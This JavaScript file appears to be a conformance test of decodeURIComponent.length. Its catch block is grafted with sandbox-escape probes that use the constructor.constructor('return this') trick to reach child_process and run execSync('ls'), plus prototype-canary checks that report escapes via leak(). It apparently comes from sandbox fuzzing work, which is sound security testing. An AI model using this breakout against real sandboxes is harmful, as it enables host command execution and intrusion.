try {
    if (decodeURIComponent.hasOwnProperty('length') !== true) {
        $ERROR('#1: decodeURIComponent.hasOwnProperty(\'length\') === true. Actual: ' + decodeURIComponent.hasOwnProperty('length'));
    }
    delete decodeURIComponent.length;
    if (decodeURIComponent.hasOwnProperty('length') !== false) {
        $ERROR('#2: delete decodeURIComponent.length; decodeURIComponent.hasOwnProperty(\'length\') === false. Actual: ' + decodeURIComponent.hasOwnProperty('length'));
    }
    if (decodeURIComponent.length === undefined) {
        $ERROR('#3: delete decodeURIComponent.length; decodeURIComponent.length !== undefined');
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}